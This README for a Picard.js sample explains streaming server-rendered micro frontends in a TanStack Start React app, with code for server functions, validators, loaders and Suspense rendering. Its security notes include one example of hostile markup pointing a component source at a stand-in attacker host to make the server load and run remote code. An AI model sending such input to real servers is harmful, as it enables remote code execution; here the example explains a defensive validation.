# Picard.js with TanStack Start (Streaming SSR)

A [TanStack Start](https://tanstack.com/start) application (React, Vite) that renders micro frontends on the server with *server functions*, streams them to the browser, and resumes them there, including after client-side navigations.

## What Picard.js Does Here

TanStack Start differs from most SSR frameworks in one way that matters here: **route loaders are isomorphic.** A loader runs on the server for the first request, but in the browser for every client-side navigation. You can't call `picard-js/node` from a loader directly, because that code must never reach the browser.

TanStack Start's answer is the *server function* (`createServerFn`). It always runs on the server: called during server rendering it's a plain function call, and called in the browser it becomes an RPC request. The sample wraps Picard.js in two server functions and calls them from the loaders:

1. **First request.** The loader calls the server function directly. It returns a promise of the decorated HTML, which the loader passes on *without awaiting it*. TanStack Start sends the page right away and streams the micro frontend into a `Suspense` boundary once Picard.js has rendered it.
2. **Client-side navigation.** The loader runs in the browser and the server function becomes a `GET /_serverFn/...` request. The micro frontends of the next page are still rendered on the server, then inserted and hydrated by the islands script.

In the browser, the islands script hydrates `pi-ssr-html` and renders the client-only micro frontends of the demo feed (`server="none"`).

## How It Is Integrated

**1. Initialize Picard.js on the server.** [`src/picard/picard.server.ts`](./src/picard/picard.server.ts):

```ts
export const picard = initializePicard({
  feed: 'https://feed.piral.cloud/api/v1/microfrontends/picard-demos',
  interactive: true,
  scriptUrl: '/picard/picard.js',
})
```

It's only imported by the server functions, whose handlers TanStack Start removes from the client bundle, so `picard-js` never reaches the browser.

**2. Server functions.** [`src/picard/functions.ts`](./src/picard/functions.ts) renders a component or a part:

```ts
export const renderComponent = createServerFn({ method: 'GET' })
  .validator((ref: ComponentRef) => {
    if (!names.test(ref.name) || !names.test(ref.source) || ref.source.includes('//')) {
      throw new Error('Invalid component reference.')
    }

    return ref
  })
  .handler(({ data }) => picard.decorate(componentMarkup(data)))

export const renderPart = createServerFn({ method: 'GET' })
  .validator((name: 'style' | 'script') => {
    if (name !== 'style' && name !== 'script') {
      throw new Error('Invalid part.')
    }

    return name
  })
  .handler(({ data: name }) => picard.decorate(`<pi-part name="${name}"></pi-part>`))
```

The functions take a component *reference* (name, source, data) and build the markup on the server ([`src/picard/markup.ts`](./src/picard/markup.ts)), never raw HTML. See [Good to Know](#good-to-know) for why.

**3. Loaders return the promises.** [`src/routes/index.tsx`](./src/routes/index.tsx):

```tsx
export const Route = createFileRoute('/')({
  loader: () => ({
    counter: renderComponent({ data: { name: 'ssr-counter', source: 'pi-ssr-html', data: { start: 5 } } }),
  }),
  component: Home,
})

function Home() {
  const { counter } = Route.useLoaderData()
  return <PicardHtml html={counter} />
}
```

**4. Show the HTML with `Suspense` and `Await`.** [`src/picard/PicardHtml.tsx`](./src/picard/PicardHtml.tsx):

```tsx
function Html({ html }: { html: string }) {
  return <div style={{ display: 'contents' }} dangerouslySetInnerHTML={{ __html: html }} suppressHydrationWarning />
}

export function PicardHtml({ html }: { html: Promise<string> }) {
  return (
    <Suspense>
      <Await promise={html}>{(content) => <Html html={content} />}</Await>
    </Suspense>
  )
}
```

The same file has `PicardClientComponent` for the client-only micro frontends. It inserts `<pi-component ... server="none">` as markup without a server round trip:

```tsx
<PicardClientComponent name="counter" source="pi-simple-html" />
```

**5. The parts in the root route.** [`src/routes/__root.tsx`](./src/routes/__root.tsx) loads the styles and the state with the islands script the same way, and places them in the document:

```tsx
export const Route = createRootRoute({
  loader: () => ({
    style: renderPart({ data: 'style' }),
    script: renderPart({ data: 'script' }),
  }),
  // the parts belong to the document, i.e., they are only needed once
  staleTime: Infinity,
  shellComponent: RootDocument,
})

// in RootDocument
<body>
  <PicardHtml html={style} />
  {/* ... */}
  <Scripts />
  <PicardHtml html={script} />
</body>
```

`staleTime: Infinity` keeps the root loader from running again on navigations. The islands script is loaded once and handles the micro frontends of every following page.

**6. Serve the islands script.** [`src/routes/picard/$file.ts`](./src/routes/picard/$file.ts) is a server route:

```ts
export const Route = createFileRoute('/picard/$file')({
  server: {
    handlers: {
      GET: ({ params }) => {
        const content = getIslandsFile(params.file)

        if (content === undefined) {
          return new Response('Not found', { status: 404 })
        }

        return new Response(content, { headers: { 'content-type': 'text/javascript' } })
      },
    },
  },
})
```

## Good to Know

- **Server functions are public endpoints.** Anyone can call them with any input, not just your loaders. A server function decorating arbitrary HTML would let a caller send `<pi-component source="https://evil.example/remoteEntry.js" format="module">` and make your server load and run that code. So the functions accept only a validated component reference without a `format`. Picard.js then resolves `source` against the feed, i.e., it only loads micro frontends listed there.
- **Never let React render a `pi-component`.** The islands script may fill a `pi-component` before React hydrates (e.g., in development, where React loads later). React would then find children it didn't render, fail the hydration, and render the whole page again. As markup inside `dangerouslySetInnerHTML`, the element belongs to Picard.js alone. `suppressHydrationWarning` silences React's development warning that the inner HTML has changed, which is expected once Picard.js has resumed the component.
- **Streaming moves elements.** React puts streamed `Suspense` content into a hidden container and moves it into place later. Picard.js keeps a resumed micro frontend when its element is moved.
- **Style part in the body.** Streamed content can't be placed in the head, so the style part comes first in the body, where `style` and `link` elements are allowed, too.
- **Preloading.** The router preloads routes on hover (`defaultPreload: 'intent'`), which also calls the server functions. The micro frontends of the next page are often rendered before the click.

## Running

```sh
npm install
npm run dev
```

For production:

```sh
npm run build
npm run preview
```

Then open `http://localhost:3000` (development) or `http://localhost:4173` (preview). The build in `dist/` can be deployed with any of TanStack Start's [hosting options](https://tanstack.com/start/latest/docs/framework/react/guide/hosting).

See [React Router](../../react-router/ssr/) and [Next.js](../../next/ssr/) for streaming micro frontends with other React frameworks.

---

**Picard.js** · [Website](https://picard.js.org) · [Repository](https://github.com/picardjs/picard) · [All samples](../../README.md)
